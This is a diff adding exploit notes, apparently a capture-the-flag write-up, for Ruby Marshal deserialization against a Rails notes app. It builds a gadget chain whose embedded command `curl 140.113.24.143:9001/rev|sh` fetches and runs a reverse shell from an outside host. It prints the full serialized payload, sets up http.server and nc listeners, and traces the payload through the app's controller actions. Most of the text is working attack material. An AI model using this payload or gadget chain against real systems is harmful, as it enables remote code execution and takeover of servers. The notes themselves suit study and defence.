@@ -1,0 +1,63 @@
+# Create Payload
+    pry --simple-prompt
+
+    require "active_model"
+    cg = ActiveModel::AttributeMethods::ClassMethods.const_get("CodeGenerator").new(ActiveModel, "", 0)
+    cg.instance_variable_set :@sources, ["`curl 140.113.24.143:9001/rev|sh`\n"]
+    depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(cg, :execute)
+    payload = Marshal.dump(depr)
+    puts payload.inspect
+
+    "\x04\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0E@instanceo:?ActiveModel::AttributeMethods::ClassMethods::CodeGenerator\n:\v@ownerm\x10ActiveModel:\n@pathI\"\x00\x06:\x06ET:\n@linei\x00:\r@sources[\x06I\"'`curl 140.113.24.143:9001/rev|sh`\n\x06;\nT:\r@renames{\x00:\f@method:\fexecute:\t@varI\"\r@execute\x06;\nT:\x10@deprecatorIu:\x1FActiveSupport::Deprecation\x00\x06;\nT"
+
+# Put payload in exploit.py
+
+# Prepare reverse shell listener and webserver
+    python3 -m http.server 9001
+    nc -lvnp 9002
+
+# Exploit
+    python3 exploit.py
+
+
+Exploit Script Steps
+    get /users/new 
+        new
+    post /users
+        create
+            before_action
+                valid_user_id? => raw_user_id
+                    /notes/l3o
+                valid_attributes? => user_params
+                    @user_params = {"username"=>"l3o", "name"=>"\u0004\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\u000E@instanceo:?ActiveModel::AttributeMethods::ClassMethods::CodeGenerator\n:\v@ownerm\u0010ActiveModel:\n@pathI\"\u0000\u0006:\u0006ET:\n@linei\u0000:\r@sources[\u0006I\"'`curl 140.113.24.143:9001/rev|sh`\n\u0006;\nT:\r@renames{\u0000:\f@method:\fexecute:\t@varI\"\r@execute\u0006;\nT:\u0010@deprecatorIu:\u001FActiveSupport::Deprecation\u0000\u0006;\nT"}
+            create method
+                cache_key => user_id => raw_user_id
+                    @user_id = /notes/l3o
+                    @cache_key = /notes/l3o
+                    @user_params = {"username"=>"l3o", "name"=>"\u0004\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\u000E@instanceo:?ActiveModel::AttributeMethods::ClassMethods::CodeGenerator\n:\v@ownerm\u0010ActiveModel:\n@pathI\"\u0000\u0006:\u0006ET:\n@linei\u0000:\r@sources[\u0006I\"'`curl 140.113.24.143:9001/rev|sh`\n\u0006;\nT:\r@renames{\u0000:\f@method:\fexecute:\t@varI\"\r@execute\u0006;\nT:\u0010@deprecatorIu:\u001FActiveSupport::Deprecation\u0000\u0006;\nT"}
+
+                    redirect to show
+
+                    @user_id = /notes/l3o
+        show
+            before_action
+                user_exists? => existing_user => cache_key => user_id => raw_user_id
+                    @user_id = /notes/l3o
+                    @cache_key = /notes/l3o
+                    @existing_user = "\u0004\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\u000E@instanceo:?ActiveModel::AttributeMethods::ClassMethods::CodeGenerator\n:\v@ownerm\u0010ActiveModel:\n@pathI\"\u0000\u0006:\u0006ET:\n@linei\u0000:\r@sources[\u0006I\"'`curl 140.113.24.143:9001/rev|sh`\n\u0006;\nT:\r@renames{\u0000:\f@method:\fexecute:\t@varI\"\r@execute\u0006;\nT:\u0010@deprecatorIu:\u001FActiveSupport::Deprecation\u0000\u0006;\nT"
+                valid_user_id? => raw_user_id
+                    /notes/l3o
+            
+                        
+    get /notes/l3o
+        show
+            before_action
+                note_exists? => note_data => note_id
+                    @note_id = l3o
+                    @note_data = "\u0004\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\u000E@instanceo:?ActiveModel::AttributeMethods::ClassMethods::CodeGenerator\n:\v@ownerm\u0010ActiveModel:\n@pathI\"\u0000\u0006:\u0006ET:\n@linei\u0000:\r@sources[\u0006I\"'`curl 140.113.24.143:9001/rev|sh`\n\u0006;\nT:\r@renames{\u0000:\f@method:\fexecute:\t@varI\"\r@execute\u0006;\nT:\u0010@deprecatorIu:\u001FActiveSupport::Deprecation\u0000\u0006;\nT"
+                valid_note_id? => note_id
+                    @note_id = l3o
+            show method
+                existing_note => note_data
+                    @note_data = "\u0004\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\u000E@instanceo:?ActiveModel::AttributeMethods::ClassMethods::CodeGenerator\n:\v@ownerm\u0010ActiveModel:\n@pathI\"\u0000\u0006:\u0006ET:\n@linei\u0000:\r@sources[\u0006I\"'`curl 140.113.24.143:9001/rev|sh`\n\u0006;\nT:\r@renames{\u0000:\f@method:\fexecute:\t@varI\"\r@execute\u0006;\nT:\u0010@deprecatorIu:\u001FActiveSupport::Deprecation\u0000\u0006;\nT"
+                    @existing_note = "\u0004\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\u000E@instanceo:?ActiveModel::AttributeMethods::ClassMethods::CodeGenerator\n:\v@ownerm\u0010ActiveModel:\n@pathI\"\u0000\u0006:\u0006ET:\n@linei\u0000:\r@sources[\u0006I\"'`curl 140.113.24.143:9001/rev|sh`\n\u0006;\nT:\r@renames{\u0000:\f@method:\fexecute:\t@varI\"\r@execute\u0006;\nT:\u0010@deprecatorIu:\u001FActiveSupport::Deprecation\u0000\u0006;\nT"
